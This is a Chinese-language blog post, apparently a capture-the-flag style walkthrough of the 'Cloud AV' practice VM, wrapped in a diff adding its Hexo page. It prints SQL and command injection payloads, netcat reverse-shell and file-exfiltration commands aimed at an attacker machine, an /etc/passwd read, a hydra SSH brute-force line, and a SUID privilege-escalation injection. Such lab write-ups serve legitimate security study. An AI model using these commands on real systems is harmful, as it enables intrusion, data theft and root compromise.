@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha256-xejo6yLi6vGtAjcMIsY8BHdKsLg7QynVlFMzdQgUuy8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"topdayplus.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.12.3","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="CLOUD AV 打靶记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BOREDHACKERBLOG: CLOUD AV">
+<meta property="og:url" content="http://topdayplus.github.io/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/index.html">
+<meta property="og:site_name" content="Topday&#39;s Blog">
+<meta property="og:description" content="CLOUD AV 打靶记录">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://topdayplus.github.io/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/01.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/02.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/03.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/04.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/05.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/06.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/07.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/08.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/09.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/10.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/11.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/12.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/13.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/14.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/15.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/16.png">
+<meta property="article:published_time" content="2022-10-23T04:03:18.000Z">
+<meta property="article:modified_time" content="2022-11-12T15:40:41.398Z">
+<meta property="article:author" content="Topday">
+<meta property="article:tag" content="打靶">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://topdayplus.github.io/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/01.png">
+
+
+<link rel="canonical" href="http://topdayplus.github.io/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://topdayplus.github.io/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/","path":"2022/10/23/BOREDHACKERBLOG-CLOUD-AV/","title":"BOREDHACKERBLOG: CLOUD AV"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>BOREDHACKERBLOG: CLOUD AV | Topday's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Topday's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Topday"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">Topday</p>
+  <div class="site-description" itemprop="description">For me, it has not yet been realized what the rest of one’s life, is my greatest encouragement.</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/topdayplus" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;topdayplus" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://topdayplus.github.io/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Topday">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Topday's Blog">
+      <meta itemprop="description" content="For me, it has not yet been realized what the rest of one’s life, is my greatest encouragement.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="BOREDHACKERBLOG: CLOUD AV | Topday's Blog">
+      <meta itemprop="description" content="CLOUD AV 打靶记录">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          BOREDHACKERBLOG: CLOUD AV
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+  
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-10-23 12:03:18" itemprop="dateCreated datePublished" datetime="2022-10-23T12:03:18+08:00">2022-10-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-11-12 23:40:41" itemprop="dateModified" datetime="2022-11-12T23:40:41+08:00">2022-11-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%BA%A2%E9%98%9F/" itemprop="url" rel="index"><span itemprop="name">红队</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1.8k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>2 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">CLOUD AV 打靶记录</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p><strong>0x01 主机发现</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in $(seq 1 254); do sudo arping -c 2 10.0.2.$i; done</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/01.png" class title="This is an example image">
+
+
+
+<p><strong>0x02 端口扫描</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.5</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/02.png" class title="This is an example image">
+
+
+
+<p><strong>0x03 服务识别</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p22,8080 -sV 10.0.2.5</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/03.png" class title="This is an example image">
+
+
+
+<p><strong>0x04 堆叠注入</strong></p>
+<p>访问Web服务瞧瞧</p>
+<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/04.png" class title="This is an example image">
+
+
+
+<p>有输入框，挂BP抓个包看看</p>
+<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/05.png" class title="This is an example image">
+
+
+
+<p>基本全明文，那把参数替换成特殊字符试试，把键盘上所有的特殊字符做成字典，过一遍看有无报错</p>
+<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/06.png" class title="This is an example image">
+
+
+
+<p>看到报错信息了，在页面上注入查看详细信息。</p>
+<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/07.png" class title="This is an example image">
+
+
+
+<p>看到报错信息，是sqlite数据库，连数据库语句都报出来了。</p>
+<p>尝试万能密码绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; or 1=1--</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/08.png" class title="This is an example image">
+
+
+
+<p>猜测功能为输入文件名，调用杀毒程序进行查杀。</p>
+<p>系统应该是执行    avscan fileName  类似的命令，尝试堆叠注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello | id</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/09.png" class title="This is an example image">
+
+
+
+<p>堆叠注入成功，代表此处存在命令注入。</p>
+<p>由上面的服务发现可知，系统存在python2环境，此处可以用Python代码执行反弹shell，但考虑到代码过长，选择另一种更为常见的方式，<strong>nc反弹shell</strong>。</p>
+<p>nc常用在反弹shell，它既可以主动发起连接，也可以被动等待连接，常用命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">主动发起连接,-e参数是指连接交予sh</span></span><br><span class="line">nc ip 4444 -e /bin/sh</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">被动接受连接</span></span><br><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>
+
+<p>这里有个需要注意的地方，不同发行版的Linux用的是不同版本的nc，部分nc没有-e参数，不指定权限交予程序。</p>
+<p>先尝试用带 e 的命令行注入，无连接反应。</p>
+<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/10.png" class title="This is an example image">
+
+<p>这里介绍一种新思路：</p>
+<p>1、受害机通过nc建立一个普通连接<br>2、把第一个连接的输入重定向到受害者本地的&#x2F;bin&#x2F;bash<br>3、把&#x2F;bin&#x2F;bash的输入重定向到另一个nc连接</p>
+<p>首先，本地开启两个Nc端口监听</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第一个Nc监听，用于执行命令</span></span><br><span class="line">nc -nvlp 3333</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第二个Nc监听，用于输入执行结果</span></span><br><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>
+
+<p>受害机执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hello为堆叠注入，</span></span><br><span class="line">hello | nc 10.0.2.4 3333 | /bin/bash | nc 10.0.2.4 4444</span><br></pre></td></tr></table></figure>
+
+<p>得到反弹shell，3333端口用于命令输入，4444端口用于结果输出。</p>
+<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/11.png" class title="This is an example image">
+
+
+
+<p><strong>0x05 SSH爆破尝试</strong></p>
+<p>进行信息收集，看到database.sql文件。</p>
+<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/12.png" class title="This is an example image">
+
+<p>由先前报错可知，采用的是sqlite数据库，转了一圈发现本地没有sqlite环境读取，则把文件下载到本地来读取。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">nc进行文件传输</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kali进行nc端口监听</span></span><br><span class="line">nc ip 5555 &gt; db.sql</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">目标机进行nc数据传输</span></span><br><span class="line">nc ip 5555 &lt; database.sql</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 本地读取sqlite文件</span><br><span class="line">sqlite3</span><br><span class="line">.open db.sql</span><br><span class="line">.database</span><br><span class="line">.dump</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/13.png" class title="This is an example image">
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">读取当前系统有bash权限的用户</span></span><br><span class="line">cat /etc/passwd | grep /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>得到 cloudav &amp; scanner。</p>
+<p>制作字典尝试爆破SSH。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi user.txt      # cloudav | scanner</span><br><span class="line">vi password.txt  # myinvitecode123 | mysecondinvitecode | cloudavtech | mostsecurescanner</span><br><span class="line">hydra -L user.txt - P pass.txt ssh://ip</span><br></pre></td></tr></table></figure>
+
+<p>结果全部错误，木大。</p>
+<p><strong>0x06 命令行提权</strong></p>
+<p>直接在反弹shell尝试提权吧。</p>
+<p>兜兜转转一圈下来，没发现啥内核提权漏洞。只有用于搭建网站的前后端文件、数据库文件。</p>
+<p>这时，习惯用 ls -l 命令的我发现了疑点</p>
+<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/14.png" class title="This is an example image">
+
+
+
+<p>在上个目录下发现了suid属性的文件，所属是root用户，并且其他组用户还有执行权限。</p>
+<p><strong>如果用 root 所属的文件创建新的连接，那就是一个root权限的连接。</strong></p>
+<p>刚好有个.c的源文件，看看这个文件是干嘛的</p>
+<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/15.png" class title="This is an example image">
+
+
+
+<p>简单来讲就是，执行软件更新命令，那就涉及命令执行，尝试下最开始的堆叠注入吧。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./update_cloudav &quot;id | nc 10.0.2.4 6666 | /bin/bash | nc 10.0.2.4 7777&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/16.png" class title="This is an example image">
+
+<p>拿到 root 权限了。</p>
+
+    </div>
+
+    
+    
+    
+	
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Topday
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://topdayplus.github.io/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/" title="BOREDHACKERBLOG: CLOUD AV">http://topdayplus.github.io/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E6%89%93%E9%9D%B6/" rel="tag"># 打靶</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/10/17/BoredHackerBlog-Social-Network/" rel="prev" title="BoredHackerBlog: Social Network">
+                  <i class="fa fa-chevron-left"></i> BoredHackerBlog: Social Network
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/10/29/CHRONOS/" rel="next" title="CHRONOS">
+                  CHRONOS <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Topday</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">266k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">4:02</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
